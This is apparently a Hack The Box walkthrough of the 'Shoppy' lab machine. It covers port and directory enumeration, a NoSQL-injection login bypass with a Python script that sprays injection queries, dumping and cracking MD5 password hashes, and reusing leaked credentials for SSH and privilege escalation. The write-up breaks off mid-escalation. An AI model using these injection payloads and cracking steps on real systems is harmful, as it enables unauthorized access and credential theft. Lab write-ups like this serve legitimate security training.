# Shoppy

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```shell
└─$ export IP=10.129.202.0
└─$ echo $IP
10.129.202.0
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```shell
└─$ ping $IP
PING 10.129.202.0 (10.129.202.0) 56(84) bytes of data.
64 bytes from 10.129.202.0: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.129.202.0: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.129.202.0: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.129.202.0: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Enumeration

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

``` shell
└─$ nmap -sV -sC -v -oN scan.nmap $IP
```

After the scan is complete, here's the result:

```shell
Nmap scan report for 10.129.202.0
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to the nmap scan, I added `10.129.202.0 shoppy.htb` and I navigated through the website to see if there's anything interesting.

---

## Login

First thing I was greeted with was the Shoppy homepage, with nothing to see there, not even links in the source code, so I ran a `gobuster` dir scan to see hidden pages and I found `/login`

```shell
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/09/20 07:27:57 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]

...
```

So I navigated into this page and found a login form. At first I tried manually typing some simple SQL Injections but didn't work, except, there's a weird thing that whenever the query has a single quote `'`, the response takes so much time, and that made harder for me to bruteforce queries later on using `Burp Suite`, so I figured it's either causing some sort of an error, and it won't lead me anywhere, or it was intended by the machine creators, so I removed all the queries that had single quotes and retried the brute force again with `Burp Suite`.

So I literally spent 2 days trying to break into the login page, tried all techniques I know, tried everything, I brute forced all passwords lists on username "admin" to login and different usernames, until I made a little python script to automate SQL Injection attempts because the `504 Request Timeout` error stopped all brute forcers I know.

```python
import requests
import argparse

parser = argparse.ArgumentParser(description='SQL Injection using a list of queries.')
parser.add_argument('list', metavar='[path]', type=str, help='path to queries list', )
args = parser.parse_args()

url = "http://shoppy.htb"
path = "/login"

with open(args.list, "r") as queries:
	lines = queries.readlines()
	for line in lines:
		line = line.strip()
		try:
			print("Trying " + line)
			r = requests.post(url + path, json={"username": line, "password": line}, timeout=1)
			try:
				if (r.url.split("=")[1]) == "WrongCredentials":
					print("Did not work... going next.")
			except:
				print(" Worked!!!")
				print("Query: " + line)
				break
		except:
			print("Connection Error!")
	print("Quitting...")
```

and finally, the querry `admin'||''==='` somehow worked, It wasn't even included in the queries lists that I used in this attack, I don't know how I came up with this. Anyways, I'M IN!

![Admin Page of Shoppy](https://imgur.com/w7hn1FV.png)

I then navigated to the search page and inserted the same SQL Injection query without the username admin, because I wanted to dump all usernames; `'||''==='` and I got the results:

```json
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]

```
I tried breaking the admin's password hash but I couldn't. However, I managed to crack `josh`'s password using `John The Ripper`:

```shell
└─$ john --format=raw-md5 joshPasswd --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
remembermethisway (?)     
1g 0:00:00:00 DONE (2022-09-20 10:00) 5.000g/s 4060Kp/s 4060Kc/s 4060KC/s renato1989..reiji
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

`remembermethisway` Is the password of a username `josh`, but where? First I tried to connect to `ssh` since port 22 SSH was open on the target machine, but didn't work

```shell
└─$ ssh josh@$IP                                                                     
josh@10.129.208.171's password: 
Permission denied, please try again.
josh@10.129.208.171's password: 
Permission denied, please try again.
josh@10.129.208.171's password: 
josh@10.129.208.171: Permission denied 
```

So I kept looking around and fuzzing more directories/subdomains, at eventually one of them clicked using `wfuzz` and found `mattermost` subdomain!! so I added it to my `/etc/hosts` file and tried connecting to the page

```shell
└─$ wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://shoppy.htb' -H "Host: FUZZ.shoppy.htb" --hw 11

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000047340:   200        0 L      141 W      3122 Ch     "mattermost"
```

It took me to a docker deployed Mattermost, here I tried `josh`'s credentials and it logged me in, I navigated through and found some conversations between Josh and Jaeger, a CEO of this organization, and found that Jaeger sent Josh credentials to log into the machine with the username `jaeger` and password `Sh0ppyBest@pp!`!

I tried SSH connection agian with these new credentials, and I'm in!

```shell
└─$ ssh jaeger@$IP        
jaeger@10.129.208.171's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$ 
```

and I got the user flag!

---

## Privilege Escalation

I started with `sudo -l` to see if I have permissions to run any special commands and/or programs:

```shell
jaeger@shoppy:~$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
jaeger@shoppy:~$ 
```

and this password-manager program looked familiar, I saw as well in one of the conversations on the Mattermost web app, so I tried running it using `sudo -u deploy ./passwordmanager` and It asked for a password, so I started a python http server and downloaded the binary on my REMnux VM and attempted to reverse engineer it if necessary.

I started with `strings` but didn't give me any clues so I loaded it in `Ghidra` and started looking at it. After some time with `Ghidra` I couldn't really get to anything due to `Ghidra` being funny, so I loaded the file into `cutter` and immediately noticed the password `Sample`.

```shell
jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:/home/deploy$ 
```

more credentials? They were talking about deploying a machine, so is it another docker privilege escalation? First I tried switching to the user `deploy`:

```shell
jaeger@shoppy:/home/deploy$ su deploy
Password: 
$ 
``` 

Then I started googling and searching about how can I use this docker deployment to get root access,

<--- TO BE CONTINUED --->